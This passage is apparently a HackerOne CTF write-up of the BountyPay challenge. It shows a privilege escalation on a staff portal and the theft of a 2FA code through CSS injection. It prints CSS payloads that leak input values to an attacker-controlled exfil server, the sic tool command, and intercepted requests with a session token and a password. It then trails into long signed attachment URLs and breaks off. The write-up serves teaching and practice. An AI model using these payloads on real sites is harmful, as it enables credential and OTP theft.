application/json\nConnection: keep-alive\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n## 0x06 staff.bountypay.h1ctf.com\n\nThe staff portal at a first look seems almost read-only, the only dynamic parts are:\n- the `login` page;\n- the `$_GET[\"template\"]` parameter which allows using a specific website section;\n- the `profile` tab where you can edit your name and your avatar;\n- the `Report This Page` feature, which sends an URL to the admin fo review.\n\nDoing some more recon I found something very interesting in the [website.js](https://staff.bountypay.h1ctf.com/js/website.js):\n```js\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}), $(\".tab\").click(function() {\n    return $(\".tab\").removeClass(\"active\"), $(this).addClass(\"active\"), $(\"div.content\").addClass(\"hidden\"), $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n}), $(\".sendReport\").click(function() {\n    $.get(\"/admin/report?url=\" + url, function() {\n        alert(\"Report sent to admin team\")\n    }), $(\"#myModal\").modal(\"hide\")\n}), document.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n\nBasically, if we can force the admin into visiting a webpage containing an `\u003cinput name=\"username\" value=\"sandra.allison\"\u003e` and into clicking an HTML element with an `upgradeToAdmin` class our user will be upgraded to admin.\n\nWith these objectives in mind, I tried to find which of the dynamic parts I can abuse.\n\n### login page\nThe login page reflects the content of the `$_GET[\"username\"]` variable into the `\u003cinput name=\"username\"\u003e` value attribute.\n\n### $_GET[\"template\"]\nAfter fuzzing the `$_GET[\"template\"]` parameter I discovered that it is parsed as an `array` too, so I can include more than one template on each page.\nFor example visiting the following URL results in a page containing the `home` and the `login` templates:\nhttps://staff.bountypay.h1ctf.com/?template[]=home\u0026template[]=login\n\n{F860572}\n\n### profile page\nThe profile page allows you to edit the profile picture which is set as an HTML class of a div while reading a ticket.\n\n### Report this page\nThe report this page allows to send any relative https://staff.bountypay.h1ctf.com/ URLs, but for the ones in the `/admin/` section.\n\nAt this point I was still missing one point, because I can send to the admin a page containing:\n- an `\u003cinput name=\"username\" value=\"sandra.allison\"\u003e` HTML element;\n- an HTML element with a `upgradeToAdmin` class.\nBut the admin is not clicking that element.\n\nGoing back to the `website.js` code I noticed the following code:\n```js\ndocument.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n\nIf in the `URL` ends with `#tab1` a click is done to the element having the class `tab1`, so if I add that class to the same element which has the `upgradeToAdmin` one it will be clicked!\n\n### Privilege Escalation\n\nWrapping everything up:\n1. Login as `sandra.allison`\n2. In the `Profile` tab click update, intercept the request and replace the `profile_avatar` parameter with `tab1 upgradeToAdmin`\n3. Click on the `Report To Admin`, intercept the request, `base64_decode` the `url` parameter, replace it with `/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab1` and finally `base64_encode` it\n4. Visit https://staff.bountypay.h1ctf.com/?template=home and note the new `Admin` tab\n\n{F860567}\n\n\n## 0x06 app.bountypay.h1ctf.com\nHaving the [HackerOne's CEO](https://twitter.com/martenmickos) password I went back to app.bountypay.h1ctf.com, logged-in, bypassed the 2FA as I did for the `brian.oliver`'s account and finally found the pending May 2020 payments!\n\n{F860571}\n\nI clicked `Pay` thinking the challenge was finished, but a new `2FA` screen appeared 🙃.\n\n{F860566}\n\nI intercepted the `2FA` request and saw this:\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 73\nOrigin: https://app.bountypay.h1ctf.com\nConnection: close\nReferer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\nUpgrade-Insecure-Requests: 1\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\n\nThis was enough to understand I had to exfiltrate the `OTP` via a [CSS Injection](https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/).\n\nThe idea behind data exfiltration through `CSS` is that you can set a custom `background-image` to an `input` element that matches specific conditions. By setting as `background-image` a remote `URL` pointing to the attacker server you can use it as a side-channel to retrieve the `input` name / value.\n\nThe first step I did is to identify if any `input` is present, so I sent hosted the following `CSS` file and sent its link in the `app_style` parameter.\n```css\ninput{\n        background-image: url(https://exfil.shielder.it/input);\n}\n```\n\nIn my access logs, I received 7 requests to `/input`, confirming the `CSS` injection was there and that there were 7 `input` HTML elements.\n\nTo speed up the process I set up [sic (Sequential Import Chaining) by d0nutptr](https://github.com/d0nutptr/sic), a very useful tool to exploit `CSS Injections`.\n\nI created my custom template file to bruteforce the input name:\n```\ninput[name={{:token:}}] { background: url({{:callback:}}); }\n```\n\nAnd finally started `sic` and injected the URL in the `2FA` request:\n`./sic -p 3000 --ph \"https://sic.shielder.it\" --ch \"https://exfil.shielder.it\" -t name_tamplate`\n\nThis allowed my to get the name of the 7 `input` HTML elements:\n- `code_1`\n- `code_2`\n- `code_3`\n- `code_4`\n- `code_5`\n- `code_6`\n- `code_7`\n\nI quickly wrote another template to exfiltrate the actual values and sent it:\n```\ninput[name=code_1][value={{:token:}}] { background: url({{:callback:}}/1); }\ninput[name=code_2][value={{:token:}}] { background: url({{:callback:}}/2); }\ninput[name=code_3][value={{:token:}}] { background: url({{:callback:}}/3); }\ninput[name=code_4][value={{:token:}}] { background: url({{:callback:}}/4); }\ninput[name=code_5][value={{:token:}}] { background: url({{:callback:}}/5); }\ninput[name=code_6][value={{:token:}}] { background: url({{:callback:}}/6); }\ninput[name=code_7][value={{:token:}}] { background: url({{:callback:}}/7); }\n```\n\nAfter a bunch of seconds I saw in my access logs the following entries:\n```\n/token=F\u0026id=1337/1\n/token=F\u0026id=1337/2\n/token=y\u0026id=1337/3\n/token=Y\u0026id=1337/4\n/token=J\u0026id=1337/5\n/token=E\u0026id=1337/6\n/token=h\u0026id=1337/7\n```\n\nI finally used `FFyYJEh` as `OTP` and got the beloved congrats page! 🎉🎉🎉\n\n{F860570}","automated_response":false,"created_at":"2020-06-09T13:07:44.639Z","updated_at":"2020-06-09T13:21:18.372Z","actor":{"username":"smaury","cleared":false,"url":"/smaury","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/679ftrx6ioflymqjri2icob4yl1k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22mauri-crop.jpg%22%3B%20filename%2A%3DUTF-8%27%27mauri-crop.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=425b77090e9e25cacd9a25c06c4346b5bbe7499d44e30614f8424d9c3e1a5273"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":860605,"filename":"app.JPG","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b6aYW49VuxuGuUxeJPobD22V?response-content-disposition=attachment%3B%20filename%3D%22app.JPG%22%3B%20filename%2A%3DUTF-8%27%27app.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=83cc498eb92b41db44dfeff9b4175ad3a7bbcc5d613fd5294fa4f11984fea26d"},{"id":860572,"filename":"template.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/PkDgcFwUqmuBrk8DJAup5kj2?response-content-disposition=attachment%3B%20filename%3D%22template.jpg%22%3B%20filename%2A%3DUTF-8%27%27template.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=cebba304d374a70cae620078061800b90d003efb0969a05a12238e19440c0cab"},{"id":860571,"filename":"may-payments.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yUHTFzzCMvT16Cw9bDDyDb9Z?response-content-disposition=attachment%3B%20filename%3D%22may-payments.jpg%22%3B%20filename%2A%3DUTF-8%27%27may-payments.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6e8a206cb7c8e8cb2d2f6128edffb657b6860c6ad2d728962f3c3b676028db1c"},{"id":860570,"filename":"h1-CTF.JPG","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Rp1TrmsCt1NyPZbpKGfj442z?response-content-disposition=attachment%3B%20filename%3D%22h1-CTF.JPG%22%3B%20filename%2A%3DUTF-8%27%27h1-CTF.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c7dc43192c1a83ec3a674c3fb8e8f0d360c2b1a15501bb9ee7d3089d983648ea"},{"id":860569,"filename":"badge.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Y2AB3QwfNNYssKW9791hWW6u?response-content-disposition=attachment%3B%20filename%3D%22badge.jpg%22%3B%20filename%2A%3DUTF-8%27%27badge.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8efb6a23c7cffaf0763e26a3e0d582cb2291214fc42c325635e9a4327129abb2"},{"id":860568,"filename":"frida.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Yx6KPd9cDpB93zf529o4Cj5Y?response-content-disposition=attachment%3B%20filename%3D%22frida.jpg%22%3B%20filename%2A%3DUTF-8%27%27frida.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7af4cc2f177f7275420588d70f128f6be9ebc7aa8a0c67020c965049084e95e5"},{"id":860567,"filename":"credentials.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kPvBG8LMVMNUiSv88smqQ9TE?response-content-disposition=attachment%3B%20filename%3D%22credentials.jpg%22%3B%20filename%2A%3DUTF-8%27%27credentials.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFE